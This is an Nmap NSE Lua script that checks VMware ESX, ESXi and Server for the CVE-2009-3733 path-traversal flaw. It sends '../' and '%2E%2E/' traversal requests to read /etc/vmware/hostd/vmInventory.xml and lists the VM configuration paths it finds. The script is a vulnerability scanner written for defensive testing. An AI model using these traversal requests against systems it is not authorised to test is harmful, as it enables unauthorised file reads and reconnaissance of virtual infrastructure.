local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Checks for a path-traversal vulnerability in VMWare ESX, ESXi, and Server (CVE-2009-3733).

The vulnerability was originally released by Justin Morehouse and Tony Flick, who presented at Shmoocon 2010 (http://fyrmassociates.com/tools.html).
]]

---
-- @usage
-- nmap --script http-vmware-path-vuln -p80,443,8222,8333 <host>
--
-- @output
-- | http-vmware-path-vuln:  
-- |   VMWare path traversal (CVE-2009-3733): VULNERABLE
-- |     /vmware/Windows 2003/Windows 2003.vmx
-- |     /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx
-- |     /vmware/Pentest/Pentest - Windows/Windows 2003.vmx
-- |     /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx
-- |     /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx
-- |     /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx
-- |_    /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx
-----------------------------------------------------------------------

author = "Ron Bowes"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}


portrule = shortport.port_or_service({80, 443, 8222,8333}, {"http", "https"})

local function get_file(host, port, path)
	local file

	-- Replace spaces in the path with %20
	path = string.gsub(path, " ", "%%20")

	-- Try both ../ and %2E%2E/
	file = "/sdk/../../../../../../" .. path

	local result = http.get( host, port, file)
	if(result['status'] ~= 200 or result['content-length'] == 0) then
		file = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/" .. path
		result = http.get( host, port, file)

		if(result['status'] ~= 200 or result['content-length'] == 0) then
			return false, "Couldn't download file: " .. path
		end
	end

	return true, result.body, file
end

local function fake_xml_parse(str, tag)
	local result = {}
	local index, tag_start, tag_end

	-- Lowercase the 'body' we're searching
	local lc = string.lower(str)
	-- Lowrcase the tag
	tag = string.lower(tag)

	-- This loop does some ugly pattern-based xml parsing
	index, tag_start = string.find(lc, "<" .. tag .. ">")
	while index do
		tag_end, index = string.find(lc, "</" .. tag .. ">", index)
		table.insert(result, string.sub(str, tag_start + 1, tag_end - 1)) -- note: not lowercase
		index, tag_start = string.find(lc, "<" .. tag .. ">", index)
	end

	return result
end

--local function parse_vmware_conf(str, field)
--	local index, value_start = string.find(str, field .. "[^\"]*")
--	if(not(index) or not(value_start)) then
--		return nil
--	end
--
--	local value_end = string.find(str, "\"", value_start + 1)
--	if(not(value_end)) then
--		return nil
--	end
--
--	return string.sub(str, value_start + 1, value_end - 1)
--end

local function go(host, port)
	local result, body
	local files

	-- Try to download the file
	result, body = get_file(host, port, "/etc/vmware/hostd/vmInventory.xml");
	-- It failed -- probably not vulnerable
	if(not(result)) then
		return false, "Couldn't download file: " .. body
	end

	-- Check if the file contains the proper XML
	if(string.find(string.lower(body), "configroot") == nil) then
		return false, "Server didn't return XML -- likely not vulnerable."
	end

	files = fake_xml_parse(body, "vmxcfgpath")

	if(#files == 0) then
		return true, {"No VMs appear to be installed"}
	end

	-- Process each of the .vmx files if verbosity is on
--	if(nmap.verbosity() > 1) then
--		local result, file = get_file(host, port, files[1])
--io.write(nsedebug.tostr(file))
--	end

	return true, files
end

action = function(host, port)
	-- Try a standard ../ path
	local status, result = go(host, port)

	if(not(status)) then
		return nil
	end

	local response = {}
	table.insert(response, "VMWare path traversal (CVE-2009-3733): VULNERABLE")

	if(nmap.verbosity() > 1) then
		table.insert(response, result)
	end

	return stdnse.format_output(true, response)
end

